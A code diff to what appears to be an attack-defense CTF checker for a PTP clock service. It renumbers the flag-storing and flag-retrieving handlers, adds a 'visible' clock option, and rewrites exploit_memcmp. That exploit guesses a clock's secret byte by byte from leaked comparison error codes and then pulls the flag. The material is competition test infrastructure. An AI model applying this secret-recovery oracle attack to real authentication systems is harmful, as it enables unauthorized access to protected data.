@@ -12,6 +12,7 @@ import struct
 import json
 import errno
 import fake_useragent
+import lorem
 import numpy as np
 
 from logging import LoggerAdapter
@@ -33,7 +34,7 @@ from enochecker3 import (
     PutflagCheckerTaskMessage,
     AsyncSocket,
 )
-from enochecker3.utils import assert_equals, assert_in
+from enochecker3.utils import assert_equals, assert_in, FlagSearcher
 
 import ptp_protocol
 import ptp_message
@@ -261,11 +262,12 @@ def finalize_auth_tlvs(request, secret=b"", icv=None):
 Functionality functions
 """
 
-async def create_clock(connection: WsConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: str, policy: str, description: str, expect_error=False):
+async def create_clock(connection: WsConnection, logger: LoggerAdapter, clock_id: int, port: int, visible: bool, secret: str, policy: str, description: str, expect_error=False):
     request = json.dumps({
         "task": "create_clock",
         "clockId": f"{clock_id:x}",
         "port": f"{port:x}",
+        "visible": visible,
         "authenticationPolicy": policy,
         "userDescription": description,
         "secret": secret})
@@ -280,15 +282,46 @@ async def create_clock(connection: WsConnection, logger: LoggerAdapter, clock_id
 
     if expect_error:
         try:
-            return response_decoded["error"]
+            return response_decoded["error"], response_decoded["code"]
         except KeyError:
-            raise MumbleException("Expected 'error' key in JSON response")
+            raise MumbleException("Expected 'error' and 'code' key in JSON response")
     else:
         try:
             assert_equals(response_decoded["task"], "create_clock", "Task mismatch in response")
         except KeyError:
             raise MumbleException("Expected 'task' key in JSON response")
 
+async def inspect_clock(connection: WsConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: str, expect_error=False):
+    request = json.dumps({
+        "task": "inspect_clock",
+        "clockId": f"{clock_id:x}",
+        "port": f"{port:x}",
+        "secret": secret})
+    
+    await connection.send(request)
+    response = await connection.receive()
+
+    try:
+        response_decoded = json.loads(response)
+    except json.JSONDecodeError:
+        raise MumbleException("Failed to decode JSON reponse")
+
+    if expect_error:
+        try:
+            return response_decoded["error"], response_decoded["code"]
+        except KeyError:
+            raise MumbleException("Expected 'error' and 'code' key in JSON response")
+    else:
+        try:
+            assert_equals(response_decoded["task"], "inspect_clock", "Task mismatch in response")
+        except KeyError:
+            raise MumbleException("Expected 'task' key in JSON response")
+        
+    try:
+        return response_decoded["userDescription"]
+    except KeyError:
+        raise MumbleException("Expected 'userDescription' key in JSON response")
+        
 async def get_user_description(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, expect_error=False):
     logger.debug(f"Get user description (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")
 
@@ -443,7 +476,34 @@ Checker functions
 """
 
 @checker.putflag(0)
-async def putflag_user_description_hmac(
+async def putflag_visible(
+    task: PutflagCheckerTaskMessage,
+    db: ChainDB,
+    connection: WsConnection,
+    logger: LoggerAdapter,
+) -> None:
+    clock_id, port = generate_port_id()
+    secret = generate_secret(16)
+
+    # Generate random text in the beginning, so that the flag cannot be read by PTP messages
+    prefix = ""
+    while len(prefix) < 128:
+        prefix += lorem.get_sentence(1)
+    
+    description = prefix + task.flag
+
+    if len(description) > 1024:
+        raise InternalErrorException("Encountered flag with unsupported length")
+
+    await create_clock(connection, logger, clock_id, port, True, secret, "hmac", description)
+
+    await db.set("userdata", (clock_id, port, secret))
+    await db.set("prefix_length", len(prefix))
+
+    return encode_port_id(clock_id, port)
+
+@checker.putflag(1)
+async def putflag_hmac(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     connection: WsConnection,
@@ -452,14 +512,17 @@ async def putflag_user_description_hmac(
     clock_id, port = generate_port_id()
     secret = generate_secret(50)
 
-    await create_clock(connection, logger, clock_id, port, secret, "hmac", task.flag)
+    if len(task.flag) > 128:
+        raise InternalErrorException("Encountered flag with unsupported length")
+
+    await create_clock(connection, logger, clock_id, port, False, secret, "hmac", task.flag)
 
     await db.set("userdata", (clock_id, port, secret))
 
     return encode_port_id(clock_id, port)
 
-@checker.putflag(1)
-async def putflag_user_description_plain(
+@checker.putflag(2)
+async def putflag_plain(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     connection: WsConnection,
@@ -468,14 +531,34 @@ async def putflag_user_description_plain(
     clock_id, port = generate_port_id()
     secret = generate_secret(8)
 
-    await create_clock(connection, logger, clock_id, port, secret, "plain", task.flag)
+    if len(task.flag) > 128:
+        raise InternalErrorException("Encountered flag with unsupported length")
+
+    await create_clock(connection, logger, clock_id, port, False, secret, "plain", task.flag)
 
     await db.set("userdata", (clock_id, port, secret))
 
     return encode_port_id(clock_id, port)
 
 @checker.getflag(0)
-async def getflag_user_description_hmac(
+async def getflag_visible(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    connection: WsConnection,
+    logger: LoggerAdapter,    
+) -> None:
+    try:
+        clock_id, port, secret = await db.get("userdata")
+        prefix_length = await db.get("prefix_length")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+
+    received_description = await inspect_clock(connection, logger, clock_id, port, secret)
+
+    assert_equals(received_description[prefix_length:], task.flag, "Received wrong flag")
+
+@checker.getflag(1)
+async def getflag_hmac(
     task: GetflagCheckerTaskMessage,
     db: ChainDB,
     connection: UdpConnection,
@@ -493,8 +576,8 @@ async def getflag_user_description_hmac(
     
     assert_equals(received_description, task.flag, "Received wrong flag")
 
-@checker.getflag(1)
-async def getflag_user_description_plain(
+@checker.getflag(2)
+async def getflag_plain(
     task: GetflagCheckerTaskMessage,
     db: ChainDB,
     connection: UdpConnection,
@@ -519,7 +602,7 @@ async def putnoise_sync(
     clock_id, port = generate_port_id()
     secret = generate_secret(50)
 
-    await create_clock(connection, logger, clock_id, port, secret, "hmac", "")
+    await create_clock(connection, logger, clock_id, port, True, secret, "hmac", "")
 
     await db.set("userdata", (clock_id, port, secret))
 
@@ -534,10 +617,10 @@ async def putnoise_user_description_twice(
     secret = generate_secret(50)
     description = generate_secret(50)
 
-    await create_clock(connection, logger, clock_id, port, secret, "hmac", description)
-    error = await create_clock(connection, logger, clock_id, port, secret, "hmac", generate_secret(50), True)
+    await create_clock(connection, logger, clock_id, port, True, secret, "hmac", description)
+    error, code = await create_clock(connection, logger, clock_id, port, True, secret, "hmac", generate_secret(50), True)
 
-    assert_equals(error, "Failed to claim port", "Wrong error message")
+    assert_equals(error, "Failed to create clock in database", "Wrong error message")
 
     await db.set("userdata", (clock_id, port, secret, description))
 
@@ -621,89 +704,63 @@ async def havoc_sync(
 @checker.exploit(0)
 async def exploit_memcmp(
     task: ExploitCheckerTaskMessage,
-    connection: UdpConnection,
+    searcher: FlagSearcher,
+    connection: WsConnection,
     logger:LoggerAdapter
 ) -> typing.Optional[str]:
     if task.attack_info is None:
         raise MumbleException("No attack info")
     
     clock_id, port = decode_port_id(task.attack_info)
-    local_clock_id, local_port = generate_port_id()
+    
+    secret = ""
 
-    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)
+    for i in range(16):
+        async def guess_byte(secret):
+            request = json.dumps({
+                "task": "inspect_clock",
+                "clockId": f"{clock_id:x}",
+                "port": f"{port:x}",
+                "secret": secret})
+    
+            await connection.send(request)
+            response = await connection.receive()
 
-    payload = message.get_payload()
-    payload.management.target_port_id.clock_id = clock_id
-    payload.management.target_port_id.port = port
-    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
-    payload.management.starting_boundary_hops = 0
-    payload.management.boundary_hops = 0
+            response_decoded = json.loads(response)
 
-    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
-    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
+            if "userDescription" in response_decoded:
+                # Early return in case we guessed the ICV prematurely
+                logger.info("Early return")
+                return 0
 
-    add_auth_tlv(message, "hmac")
-    request = message.encode(connection.BUFFER_SIZE)
+            return response_decoded["code"]
 
-    icv = bytearray(16)
-
-    for i in range(len(icv)):
-        async def guess_byte(icv):
-            finalize_auth_tlvs(request, icv=icv)
-
-            connection.send_raw(request, GENERAL_PORT)
-            response = await connection.receive(GENERAL_PORT)
-
-            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
-                raise MumbleException("Expected management message")
-
-            for tlv in response.get_tlvs():
-                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
-                    return tlv.payload.management_error_status.error_id - 0xc000
-                elif tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
-                    # Early return in case we guessed the ICV prematurely
-                    logger.info("Early return")
-                    return 0
-                
-            raise MumbleException("No error status in response")
-
-        guess_0 = await guess_byte(icv)
-        icv[i] = 1
-        guess_1 = await guess_byte(icv)
+        guess_0 = await guess_byte(secret)
+        secret += chr(1)
+        guess_1 = await guess_byte(secret)
+        secret = secret[:-1]
 
         # Check if we skipped a byte
         if guess_0 == guess_1 + 1 and guess_0 != 10:
-            icv[i] = guess_0
+            secret += chr(guess_0)
         else:
-            icv[i] = 10
-            guess_10 = await guess_byte(icv)
+            secret += chr(10)
+            guess_10 = await guess_byte(secret)
+            secret = secret[:-1]
 
             # Tiebraker
             if guess_0 == 1 and guess_10 == 9:
-                icv[i] = 1
+                secret += chr(1)
             elif guess_0 == 10 and guess_1 == 9:
-                icv[i] = 10
+                secret += chr(10)
             else:
-                icv[i] = 0
+                secret += chr(0)
 
-    finalize_auth_tlvs(request, icv=icv)
-
-    connection.send_raw(request, GENERAL_PORT)
-    response = await connection.receive(GENERAL_PORT)
-
-    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
-        raise MumbleException("Expected management message in response")
+    received_description = await inspect_clock(connection, logger, clock_id, port, secret)
+    received_flag = searcher.search_flag(received_description)
     
-    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
-        raise MumbleException("Expected management response action")
-    
-    for tlv in response.get_tlvs():
-        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
-            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
-                logger.info(f"Received flag {received_flag}")
-                return received_flag
-
+    logger.info(f"Received flag {received_flag}")
+    return received_flag
 
 @checker.exploit(1)
 async def exploit_zerolength(
